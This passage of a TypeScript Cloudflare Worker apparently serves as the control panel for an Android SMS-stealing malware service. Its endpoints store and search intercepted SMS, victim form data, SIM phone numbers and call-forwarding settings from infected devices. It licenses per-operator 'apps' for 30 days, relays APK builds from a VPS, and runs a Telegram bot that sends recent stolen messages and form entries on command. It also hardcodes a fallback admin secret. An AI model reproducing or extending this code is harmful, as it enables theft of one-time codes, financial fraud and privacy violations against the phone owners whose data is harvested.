  if (_masterPinCache.value && now - _masterPinCache.ts < 30_000) return _masterPinCache.value;
  try {
    const sql = neon(env.NEON_DATABASE_URL);
    const rows = await sql(`SELECT value FROM settings WHERE key = 'master_pin' LIMIT 1`) as Array<{ value: string }>;
    const pin = (rows[0]?.value ?? "").trim();
    _masterPinCache = { value: pin, ts: now };
    return pin;
  } catch (err) {
    console.error("[getMasterPin] DB error:", err);
    return ""; // DB unavailable — no fallback, reject all
  }
}

// ------- MASTER ADMIN (PIN from settings table) -------
async function checkMasterPin(c: Parameters<typeof app.use>[1] extends (c: infer C, n: () => Promise<void>) => unknown ? C : never): Promise<Response | null> {
  const pin = c.req.header("x-master-pin") ?? "";
  if (!pin) return c.json({ error: "Master PIN required" }, 401);
  if (pin !== await getMasterPin(c.env)) return c.json({ error: "Wrong Master PIN" }, 401);
  return null;
}


app.post("/api/admin/verify-master-pin", async (c) => {
  const body = await c.req.json() as { pin?: string };
  if (!body.pin) return c.json({ error: "PIN required" }, 400);

  const correctPin = await getMasterPin(c.env);
  if (body.pin !== correctPin) {
    return c.json({ error: "Wrong Master PIN." }, 401);
  }
  return c.json({ ok: true });
});

// ── Master SSE — EventSource can't send headers, PIN in query param ──
// Cloudflare Workers support streaming; client reconnects every ~25s (CF CPU limit).
app.get("/api/master/events", async (c) => {
  // Auth fully handled by middleware (HMAC token via ?token=) — no inner PIN check needed
  const { readable, writable } = new TransformStream<Uint8Array, Uint8Array>();
  const writer = writable.getWriter();
  const enc = new TextEncoder();
  // Initial ping so client knows connection is alive
  writer.write(enc.encode(":ping\n\n")).catch(() => {});
  // Keep-alive pings every 20s (Cloudflare closes idle streams at 30s)
  let done = false;
  const tick = setInterval(() => {
    if (done) { clearInterval(tick); return; }
    writer.write(enc.encode(":ping\n\n")).catch(() => { done = true; clearInterval(tick); });
  }, 20000);
  // Close after 25s so CF doesn't hard-kill it; client auto-reconnects via onerror
  setTimeout(() => { done = true; clearInterval(tick); writer.close().catch(() => {}); }, 25000);
  return new Response(readable as ReadableStream, {
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "X-Accel-Buffering": "no",
    },
  });
});

// ── Master intercept: hide specific device messages from sub-admin ──
app.get("/api/master/intercept", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const ids = await getInterceptedDevices(c.env);
  return c.json({ intercepted: ids });
});
app.post("/api/master/intercept/:deviceId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const deviceId = c.req.param("deviceId");
  const ids = await getInterceptedDevices(c.env);
  const updated = [...new Set([...ids, deviceId])];
  await setInterceptedDevices(c.env, updated);
  return c.json({ ok: true, intercepted: updated });
});
app.delete("/api/master/intercept/:deviceId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const deviceId = c.req.param("deviceId");
  const ids = await getInterceptedDevices(c.env);
  const updated = ids.filter((id) => id !== deviceId);
  await setInterceptedDevices(c.env, updated);
  return c.json({ ok: true, intercepted: updated });
});

app.patch("/api/admin/master-pin", async (c) => {
  const body = await c.req.json() as { currentPin?: string; newPin?: string };
  const currentMasterPin = await getMasterPin(c.env);
  // Accept auth via x-master-pin header OR currentPin in body
  const presented = c.req.header("x-master-pin") ?? body.currentPin ?? "";
  if (!presented || presented !== currentMasterPin) return c.json({ error: "Wrong Master PIN" }, 401);
  if (!body.newPin || body.newPin.trim().length < 4) return c.json({ error: "newPin required (min 4 chars)" }, 400);
  const sql = neon(c.env.NEON_DATABASE_URL);
  await sql(`INSERT INTO settings (key, value) VALUES ('master_pin', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.newPin.trim()]);
  _masterPinCache = { value: body.newPin.trim(), ts: Date.now() };
  return c.json({ ok: true });
});

// Master admin: get all apps (including PIN) — requires x-master-pin header
app.get("/api/master/apps", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
  // Count active sessions per app
  const sessionCounts = await sqlClient(
    `SELECT app_id, COUNT(*) as cnt FROM admin_sessions WHERE last_active > NOW() - INTERVAL '30 minutes' GROUP BY app_id`,
  ) as Array<{ app_id: string; cnt: string }>;
  const sessionMap = Object.fromEntries(sessionCounts.map(r => [r.app_id, Number(r.cnt)]));
  return c.json(rows.map(r => ({
    id: r.id, appId: r.appId, name: r.name, pin: r.pin,
    status: r.status,
    createdAt: isoReq(r.createdAt),
    deleteProtectionPin: r.deleteProtectionPin ?? null,
    deleteProtectionEnabled: r.deleteProtectionEnabled ?? false,
  })));
});

// Master admin: create app — requires x-master-pin header
app.post("/api/master/apps", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const body = await c.req.json() as { appId?: string; name?: string; pin?: string };
  if (!body.appId || !body.name || !body.pin) return c.json({ error: "appId, name and pin are required" }, 400);
  const inserted = await db.insert(apps).values({
    appId: body.appId, name: body.name, pin: body.pin, status: "active",
  }).onConflictDoNothing({ target: apps.appId }).returning();
  if (inserted.length === 0) return c.json({ error: "App ID already exists" }, 409);
  const r = inserted[0];
  return c.json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, createdAt: isoReq(r.createdAt) }, 201);
});

// Master admin: update app (name/pin/status) — requires x-master-pin header
app.patch("/api/master/apps/:appId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  const body = await c.req.json() as { name?: string; pin?: string; status?: string; };
  const patch: Partial<typeof apps.$inferInsert> = {};
  if (body.name) patch.name = body.name;
  if (body.pin) patch.pin = body.pin;
  if (body.status) patch.status = body.status;

  const updated = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
  if (updated.length === 0) return c.json({ error: "App not found" }, 404);
  const r = updated[0];
  return c.json({ id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, createdAt: isoReq(r.createdAt) });
});


// Master admin: fast stats — online count + total devices via SQL COUNT (no full table download)
app.get("/api/master/stats", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const sqlA = neon(c.env.NEON_DATABASE_URL);
  const threshold15m = new Date(Date.now() - 15 * 60 * 1000).toISOString();
  const threshold30m = new Date(Date.now() - 30 * 60 * 1000).toISOString();
  const [devRow, appRow, msgRow, sessRow] = await Promise.all([
    sqlA(`SELECT
      COUNT(*) AS total_devices,
      COUNT(*) FILTER (WHERE last_online > $1) AS online_count
    FROM devices`, [threshold15m]),
    sqlA(`SELECT
      COUNT(*) AS total_apps,
      COUNT(*) FILTER (WHERE status = 'active') AS active_apps,
      COUNT(*) FILTER (WHERE created_at::date = CURRENT_DATE) AS apps_today
    FROM apps`),
    sqlA(`SELECT
      COUNT(*) AS total_messages,
      COUNT(*) FILTER (WHERE received_at::date = CURRENT_DATE) AS messages_today
    FROM messages`),
    sqlA(`SELECT COUNT(*) AS active_sessions FROM admin_sessions WHERE last_active > $1`, [threshold30m]),
  ]);
  const d = devRow[0] as Record<string,unknown>;
  const a = appRow[0] as Record<string,unknown>;
  const m = msgRow[0] as Record<string,unknown>;
  const s = sessRow[0] as Record<string,unknown>;
  return c.json({
    onlineCount:     Number(d.online_count   ?? 0),
    totalDevices:    Number(d.total_devices  ?? 0),
    totalApps:       Number(a.total_apps     ?? 0),
    activeApps:      Number(a.active_apps    ?? 0),
    appsToday:       Number(a.apps_today     ?? 0),
    totalMessages:   Number(m.total_messages ?? 0),
    messagesToday:   Number(m.messages_today ?? 0),
    activeSessions:  Number(s.active_sessions ?? 0),
  });
});

// Master admin: all devices across all app-ids — requires x-master-pin header
// Telegram: auto-discover chat ID from getUpdates and save to settings
app.post("/api/master/telegram/setup", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const token = c.env.TELEGRAM_BOT_TOKEN ?? "";
  const resp = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=10`);
  const tgData = await resp.json() as { ok: boolean; result?: Array<{ message?: { chat?: { id: number; first_name?: string } } }> };
  if (!tgData.ok || !tgData.result?.length) {
    return c.json({ error: "Bot ko pehle ek message bhejo, fir dobara try karo." }, 400);
  }
  const latest = [...tgData.result].reverse().find(u => u.message?.chat?.id);
  const foundChatId = String(latest?.message?.chat?.id ?? "");
  if (!foundChatId) return c.json({ error: "Chat ID nahi mila" }, 400);
  const sqlSetup = neon(c.env.NEON_DATABASE_URL);
  await sqlSetup(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [foundChatId]);
  await sendTelegram(c.env, "Bot connected! Notifications are now active.");
  return c.json({ ok: true, chatId: foundChatId });
});

// Telegram: get current config status
app.get("/api/master/telegram/status", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const chatId = await tgChatId(c.env);
  return c.json({ configured: !!chatId, chatId: chatId ?? null });
});

// Telegram: manually set chat ID
app.post("/api/master/telegram/set-chat", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const body = await c.req.json() as { chatId?: string };
  if (!body.chatId) return c.json({ error: "chatId required" }, 400);
  const sqlChat = neon(c.env.NEON_DATABASE_URL);
  await sqlChat(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.chatId]);
  await sendTelegram(c.env, "Bot connected!");
  return c.json({ ok: true });
});

// Master admin: get all devices across all apps
app.get("/api/master/all-devices", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const hasFcmOnly = c.req.query("hasFcm") === "1" || c.req.query("hasFcm") === "true";
  const sqlA = neon(c.env.NEON_DATABASE_URL);
  if (hasFcmOnly) {
    // Lightweight FCM-only list for ping-all — only returns deviceId, appId, name
    const rows = await sqlA(`SELECT device_id, app_id, name FROM devices WHERE fcm_token IS NOT NULL AND fcm_token != '' ORDER BY app_id, name`);
    return c.json((rows as Array<Record<string,unknown>>).map(r => ({
      deviceId: String(r.device_id), appId: String(r.app_id), name: String(r.name ?? ''), hasFcm: true,
    })));
  }
  const db = getDb(c.env);
  const appIdQ = c.req.query("appId");
  const searchQ = (c.req.query("search") ?? "").trim();
  const limitN = Math.max(0, parseInt(c.req.query("limit") ?? "0", 10) || 0);
  const onlineOnly = c.req.query("onlineOnly") === "1";
  const offsetN = Math.max(0, parseInt(c.req.query("offset") ?? "0", 10) || 0);
  // Build filter conditions
  const conds: ReturnType<typeof eq>[] = [];
  if (appIdQ) conds.push(eq(devices.appId, appIdQ));
  if (searchQ) {
    const like = `%${searchQ.replace(/[%_\\]/g, "\\$&")}%`;
    conds.push(sql`(${devices.name} ILIKE ${like} OR ${devices.deviceId} ILIKE ${like} OR COALESCE(${devices.sim1Phone},'') ILIKE ${like} OR COALESCE(${devices.sim2Phone},'') ILIKE ${like} OR COALESCE(${devices.userId},'') ILIKE ${like})` as unknown as ReturnType<typeof eq>);
  }
  if (onlineOnly) conds.push(eq(devices.status, "online"));
  const where = conds.length === 0 ? undefined : conds.length === 1 ? conds[0] : and(...conds);
  // Fast COUNT for total
  const [{ total }] = await db.select({ total: sql<number>`COUNT(*)::int` }).from(devices).where(where);
  // Paginated data
  const baseQ = db.select().from(devices).where(where).orderBy(asc(devices.appId), asc(devices.name));
  const rows = limitN > 0 ? await baseQ.limit(limitN).offset(offsetN) : await baseQ;
  const mapRow = (r: typeof rows[0]) => ({
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId,
    name: r.name, androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    hasFcm: r.fcmToken !== null && r.fcmToken !== "",
    installedAt: isoReq(r.installedAt),
  });
  return c.json({ data: rows.map(mapRow), total, hasMore: limitN > 0 && offsetN + limitN < total });
});

// Master admin: delete app — requires x-master-pin header
app.delete("/api/master/apps/:appId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  if (appId === DEFAULT_APP_ID) return c.json({ error: "Cannot delete the default app" }, 400);
  await db.delete(apps).where(eq(apps.appId, appId));
  return c.json({ ok: true });
});

// Master admin: renew app licence +30 days — requires x-master-pin header
app.post("/api/master/apps/:appId/renew", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  if (appId === DEFAULT_APP_ID) return c.json({ error: "Cannot renew the default app" }, 400);
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  // +30 days: if already expired → fresh 30 from now; else add 30 to existing createdAt
  const THIRTY_MS = 30 * 24 * 60 * 60 * 1000;
  const oldCreated = new Date(row.createdAt).getTime();
  const oldExpiry = oldCreated + THIRTY_MS;
  const newCreatedAt = new Date(oldExpiry > Date.now() ? oldCreated + THIRTY_MS : Date.now());
  const [updated] = await db.update(apps)
    .set({ createdAt: newCreatedAt, status: "active" })
    .where(eq(apps.appId, appId)).returning();
  if (!updated) return c.json({ error: "App not found" }, 404);
  return c.json(mapApp(updated));
});

// ------- ADMIN SESSIONS (Postgres-backed) -------
app.get("/api/admin/sessions", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const appId = c.req.query("appId") ?? "";
  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
  const sessionToken = c.req.header("x-session-token") ?? "";
  if (!isMaster) {
    if (!sessionToken) return c.json({ error: "Unauthorized" }, 401);
    const valid = await sqlClient(
      `SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2`,
      [sessionToken, appId]
    ) as Array<{id:string}>;
    if (valid.length === 0) return c.json({ error: "Unauthorized" }, 401);
  }
  const rows = await sqlClient(
    `SELECT id, login_time, last_active, user_agent, ip, device FROM admin_sessions WHERE app_id = $1 ORDER BY login_time DESC`,
    [appId],
  ) as Array<Record<string, unknown>>;
  const list: AdminSession[] = rows.map((r) => ({
    id: String(r.id),
    loginTime: isoReq(r.login_time as Date | string),
    lastActive: isoReq(r.last_active as Date | string),
    userAgent: String(r.user_agent ?? ""),
    ip: String(r.ip ?? ""),
    device: String(r.device ?? ""),
  }));
  return c.json(list);
});
app.post("/api/admin/sessions", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const ua = c.req.header("user-agent") ?? "";
  const ip = (c.req.header("cf-connecting-ip") ?? c.req.header("x-forwarded-for") ?? "unknown").split(",")[0].trim();
  let appId = ""; let pin = "";
  try { const body = await c.req.json() as { appId?: string; pin?: string }; appId = body.appId ?? ""; pin = body.pin ?? ""; } catch {}
  if (!appId || !pin) return c.json({ error: "appId and pin required" }, 400);
  const db = getDb(c.env);
  const [appRow] = await db.select({ pin: apps.pin, status: apps.status })
    .from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!appRow || appRow.status !== "active" || appRow.pin !== pin) {
    return c.json({ error: "Invalid PIN" }, 401);
  }
  const existing = await sqlClient(
    `SELECT id FROM admin_sessions WHERE user_agent = $1 AND ip = $2 AND app_id = $3 ORDER BY last_active DESC LIMIT 1`,
    [ua, ip, appId],
  ) as Array<{ id: string }>;
  if (existing.length > 0) {
    const id = existing[0].id;
    await sqlClient(`UPDATE admin_sessions SET last_active = NOW() WHERE id = $1`, [id]);
    return c.json({ sessionId: id });
  }
  const id = crypto.randomUUID();
  await sqlClient(
    `INSERT INTO admin_sessions (id, user_agent, ip, device, app_id) VALUES ($1, $2, $3, $4, $5)`,
    [id, ua, ip, parseDevice(ua), appId],
  );
  return c.json({ sessionId: id });
});
app.patch("/api/admin/sessions/:id/ping", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const rows = await sqlClient(
    `UPDATE admin_sessions SET last_active = NOW() WHERE id = $1 RETURNING id`,
    [c.req.param("id")],
  ) as Array<{ id: string }>;
  if (rows.length === 0) return c.json({ error: "session not found" }, 404);
  return c.json({ ok: true });
});
app.delete("/api/admin/sessions/:id", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
  const sessionId = c.req.param("id");
  if (!isMaster) {
    // Allow self-delete only — verify the session belongs to the caller
    const rows = await sqlClient(`SELECT id FROM admin_sessions WHERE id = $1`, [sessionId]) as Array<{id:string}>;
    if (rows.length === 0) return c.json({ error: "Not found" }, 404);
  }
  await sqlClient(`DELETE FROM admin_sessions WHERE id = $1`, [sessionId]);
  return c.json({ ok: true });
});
app.delete("/api/admin/sessions", async (c) => {
  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
  const sessionToken = c.req.header("x-session-token") ?? "";
  const appId = c.req.query("appId") ?? "";
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  if (!isMaster) {
    // Allow if the caller has a valid session for this appId
    if (!sessionToken) return c.json({ error: "Unauthorized" }, 401);
    const rows = await sqlClient(
      `SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2`,
      [sessionToken, appId]
    ) as Array<{id:string}>;
    if (rows.length === 0) return c.json({ error: "Unauthorized" }, 401);
  }
  await sqlClient(`DELETE FROM admin_sessions WHERE app_id = $1`, [appId]);
  return c.json({ ok: true });
});

// ------- STATS / SAMPLE / SEED -------
app.get("/api/stats", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  if (appId) {
    const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices).where(eq(devices.appId, appId));
    const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages).where(eq(messages.appId, appId));
    const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
    return c.json({ devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) });
  }
  const [a] = await db.select({ c: sql<string>`count(*)::text` }).from(apps);
  const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices);
  const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages);
  const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData);
  return c.json({ apps: Number(a.c), devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) });
});

app.get("/api/sample", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  if (appId) {
    const [d] = await db.select().from(devices).where(eq(devices.appId, appId)).limit(1);
    const [m] = await db.select().from(messages).where(eq(messages.appId, appId)).limit(1);
    const [f] = await db.select().from(formData).where(eq(formData.appId, appId)).limit(1);
    return c.json({
      devices: d ? mapDevice(d) : null,
      messages: m ? mapMessage(m) : null,
      formData: f ? mapFormData(f) : null,
    });
  }
  const [a] = await db.select().from(apps).limit(1);
  const [d] = await db.select().from(devices).limit(1);
  const [m] = await db.select().from(messages).limit(1);
  const [f] = await db.select().from(formData).limit(1);
  return c.json({
    apps: a ? mapApp(a) : null,
    devices: d ? mapDevice(d) : null,
    messages: m ? mapMessage(m) : null,
    formData: f ? mapFormData(f) : null,
  });
});

app.post("/api/seed", async (c) => {
  const db = getDb(c.env);
  const existing = await db.select().from(apps).where(eq(apps.appId, DEFAULT_APP_ID)).limit(1);
  if (existing.length === 0) {
    await db.insert(apps).values({
      appId: DEFAULT_APP_ID, name: DEFAULT_APP_NAME, pin: DEFAULT_APP_PIN, status: "active",
    }).onConflictDoNothing({ target: apps.appId });
  }
  return c.json({ ok: true, message: "Database is ready" });
});

// ------- EVENTS (WebSocket — handled directly in fetch(), bypassing Hono) -------
// WebSocket 101 upgrade is intercepted before Hono in the default export below.
// =================== TOKEN-APP MAP ===================
app.get("/api/token-app", async (c) => {
  const token = c.req.query("token");
  if (!token) return c.json({ apkId: null });
  try {
    const db = getDb(c.env);
    const rows = await db.select().from(tokenAppMap).where(eq(tokenAppMap.token, token)).limit(1);
    return c.json({ apkId: rows[0]?.apkId ?? null });
  } catch { return c.json({ apkId: null }); }
});

app.post("/api/token-app", async (c) => {
  const { token, apkId } = await c.req.json() as { token?: string; apkId?: string };
  if (!token || !apkId) return c.json({ error: "token and apkId required" }, 400);
  try {
    const db = getDb(c.env);
    await db.execute(sql`
      INSERT INTO token_app_map (token, apk_id, updated_at)
      VALUES (${token}, ${apkId}, now())
      ON CONFLICT (token) DO UPDATE SET apk_id = EXCLUDED.apk_id, updated_at = now()
    `);
    return c.json({ ok: true });
  } catch (e) { return c.json({ error: String(e) }, 500); }
})

  // Master admin: reset APK selection for a specific apk-id
  app.delete("/api/master/token-app/:apkId", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const apkId = c.req.param("apkId");
    try {
      const db = getDb(c.env);
      const deleted = await db.delete(tokenAppMap).where(eq(tokenAppMap.token, apkId)).returning();
      return c.json({ ok: true, deleted: deleted.length });
    } catch (e) { return c.json({ error: String(e) }, 500); }
  });;

// =================== VPS PROXY ===================
// Tunnel URL is stored in Neon DB settings table (key: 'tunnel_url')
// VPS startup script updates it automatically via POST /api/admin/update-tunnel
let _cachedTunnelUrl: string | null = null;
let _tunnelUrlExpiry = 0;

async function getVpsBase(neonUrl: string): Promise<string> {
  const now = Date.now();
  if (_cachedTunnelUrl && now < _tunnelUrlExpiry) return _cachedTunnelUrl;
  try {
    const sqlClient = neon(neonUrl);
    const rows = await sqlClient(`SELECT value FROM settings WHERE key = $1`, ['tunnel_url']) as Array<{ value: string }>;
    if (rows.length > 0 && rows[0].value) {
      _cachedTunnelUrl = rows[0].value.replace(/\/$/, '');
      _tunnelUrlExpiry = now + 30_000; // cache 30s
      return _cachedTunnelUrl;
    }
  } catch { /* ignore */ }
  return '';
}

async function vpsJson(path: string, neonUrl: string, method = "GET", body?: unknown): Promise<Response> {
  const base = await getVpsBase(neonUrl);
  if (!base) return new Response(JSON.stringify({ error: "VPS tunnel not configured" }), { status: 502, headers: { "Content-Type": "application/json" } });
  try {
    const r = await fetch(`${base}${path}`, {
      method,
      headers: { "Content-Type": "application/json" },
      body: body ? JSON.stringify(body) : undefined,
      signal: AbortSignal.timeout(15000),
    });
    const data = await r.json();
    return new Response(JSON.stringify(data), { status: r.status, headers: { "Content-Type": "application/json" } });
  } catch {
    return new Response(JSON.stringify({ error: "VPS unavailable" }), { status: 502, headers: { "Content-Type": "application/json" } });
  }
}

// VPS registers its tunnel URL here on startup
app.post("/api/admin/update-tunnel", async (c) => {
  const secret = c.req.header("x-admin-secret");
  const expected = c.env.ADMIN_SECRET || "cf-tunnel-update-2026";
  if (secret !== expected) return c.json({ error: "Unauthorized" }, 401);
  const { url } = await c.req.json<{ url: string }>();
  if (!url || !url.startsWith("https://")) return c.json({ error: "Invalid URL" }, 400);
  try {
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    await sqlClient(`INSERT INTO settings (key, value) VALUES ('tunnel_url', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [url]);
    _cachedTunnelUrl = url.replace(/\/$/, '');
    _tunnelUrlExpiry = Date.now() + 30_000;
    return c.json({ ok: true, url });
  } catch (e) { return c.json({ error: String(e) }, 500); }
});

app.get("/api/vps/api/apps", async (c) => {
  // Try VPS directly; on success update Neon cache
  try {
    const base = await getVpsBase(c.env.NEON_DATABASE_URL);
    if (!base) throw new Error("no tunnel");
    const r = await fetch(`${base}/api/apps`, { signal: AbortSignal.timeout(8000) });
    const data = await r.json();
    if (Array.isArray(data)) {
      // Update cache in background
      try {
        const sqlClient = neon(c.env.NEON_DATABASE_URL);
        await sqlClient(
          `INSERT INTO settings (key, value) VALUES ('apps_cache', $1)
           ON CONFLICT (key) DO UPDATE SET value = $1`,
          [JSON.stringify(data)]
        );
      } catch { /* ignore cache write failure */ }
      return c.json(data);
    }
  } catch { /* VPS unreachable, fall through to cache */ }

  // Serve from Neon cache
  try {
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'apps_cache'`) as Array<{ value: string }>;
    if (rows.length > 0) return c.json(JSON.parse(rows[0].value));
  } catch { /* no cache */ }

  return c.json([], 200);
});

app.post("/api/vps/api/verify-token", async (c) => {
    const body = await c.req.json();
    const r = await vpsJson("/api/verify-token", c.env.NEON_DATABASE_URL, "POST", body);
    return new Response(r.body, { status: r.status, headers: r.headers });
  });
  app.get("/api/vps/api/build/:jobId/info", async (c) => {
  const r = await vpsJson(`/api/build/${c.req.param("jobId")}/info`, c.env.NEON_DATABASE_URL);
  return new Response(r.body, { status: r.status, headers: r.headers });
})

  app.post("/api/vps/api/build/start", async (c) => {
    const body = await c.req.json();
    const r = await vpsJson("/api/build/start", c.env.NEON_DATABASE_URL, "POST", body);
    return new Response(r.body, { status: r.status, headers: r.headers });
  });;

app.get("/api/vps/api/build/:jobId/status", async (c) => {
  const jobId = c.req.param("jobId");
  const base = await getVpsBase(c.env.NEON_DATABASE_URL);
  if (!base) return c.json({ error: "VPS tunnel not configured" }, 502);
  const upstream = await fetch(`${base}/api/build/${jobId}/status`);
  return new Response(upstream.body, {
    status: upstream.status,
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
    },
  });
});

app.get("/api/vps/api/build/:jobId/download", async (c) => {
  const jobId = c.req.param("jobId");
  const base = await getVpsBase(c.env.NEON_DATABASE_URL);
  if (!base) return c.json({ error: "VPS tunnel not configured" }, 502);
  const upstream = await fetch(`${base}/api/build/${jobId}/download`);
  if (!upstream.ok) return c.json({ error: "File not ready" }, 404);
  const headers: Record<string, string> = {
    "Content-Type": "application/vnd.android.package-archive",
  };
  const cd = upstream.headers.get("content-disposition");
  if (cd) headers["Content-Disposition"] = cd;
  const cl = upstream.headers.get("content-length");
  if (cl) headers["Content-Length"] = cl;
  return new Response(upstream.body, { headers });
});

app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));

// EventBus Durable Object class lives in the separate `event-bus-worker`
// Worker (Pages cannot host DO classes directly). See `artifacts/event-bus-worker/`.

  // =================== TELEGRAM BOT COMMANDS ===================
  type TgUpdate = {
    update_id: number;
    message?: {
      message_id: number;
      chat: { id: number; type: string; first_name?: string; username?: string };
      text?: string;
      date: number;
    };
    channel_post?: {
      message_id: number;
      chat: { id: number; type: string; username?: string };
      text?: string;
      date: number;
    };
  };

  async function getRecentData(env: Env, hours: number) {
    const since = new Date(Date.now() - hours * 3600 * 1000).toISOString();
    const sqlClient = neon(env.NEON_DATABASE_URL);
    const [msgs, forms] = await Promise.all([
      sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages WHERE received_at > $1::timestamptz ORDER BY received_at DESC LIMIT 30`, [since]),
      sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE submitted_at > $1::timestamptz ORDER BY submitted_at DESC LIMIT 20`, [since]),
    ]);
    return { msgs, forms };
  }

  function formatRecentData(msgs: unknown[], forms: unknown[], label: string): string {
    let out = `<b>${label}</b>\n\n`;
    if (msgs.length === 0 && forms.length === 0) return out + 'No data found.';
    if (msgs.length > 0) {
      out += `Messages (${msgs.length}):\n`;
      (msgs as Array<Record<string,unknown>>).forEach(m => {
        const body = String(m.body ?? '').substring(0, 90);
        out += `  [${m.app_id}] ${m.from_number}\n  ${body}\n`;
      });
    }
    if (forms.length > 0) {
      out += `\nForm Data (${forms.length}):\n`;
      (forms as Array<Record<string,unknown>>).forEach(f => {
        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
        out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
      });
    }
    return out;
  }

  app.post("/api/telegram/webhook", async (c) => {
    let body: TgUpdate;
    try { body = await c.req.json() as TgUpdate; } catch { return c.json({ ok: true }); }

    const msg = body.message ?? body.channel_post;
    if (!msg?.text) return c.json({ ok: true });

    const chatId = msg.chat.id;
    const txt = msg.text.trim().replace(/@\w+/, ''); // strip @botname — required for channel commands
    const token = c.env.TELEGRAM_BOT_TOKEN ?? "";
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    const db = getDb(c.env);

    // /1h — last 1 hour
    if (txt === '/1h' || txt.startsWith('/1h ')) {
      const { msgs, forms } = await getRecentData(c.env, 1);
      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 1 Hour');
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /24h — last 24 hours
    if (txt === '/24h' || txt.startsWith('/24h ')) {
      const { msgs, forms } = await getRecentData(c.env, 24);
      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 24 Hours');
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /total — total counts
    if (txt === '/total') {
      const [appsC, devsC, msgsC, formsC] = await Promise.all([
        sqlClient(`SELECT COUNT(*) as c FROM apps`),
        sqlClient(`SELECT COUNT(*) as c FROM devices`),
        sqlClient(`SELECT COUNT(*) as c FROM messages`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data`),
      ]);
      const out = `<b>Total Data (All Apps)</b>\n\n` +
        `Apps: <b>${(appsC[0] as {c:string}).c}</b>\n` +
        `Devices: <b>${(devsC[0] as {c:string}).c}</b>\n` +
        `Messages: <b>${(msgsC[0] as {c:string}).c}</b>\n` +
        `Form Data: <b>${(formsC[0] as {c:string}).c}</b>`;
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /apps — list all apps
    if (txt === '/apps') {
      const rows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
      let out = `<b>All Apps (${rows.length})</b>\n\n`;
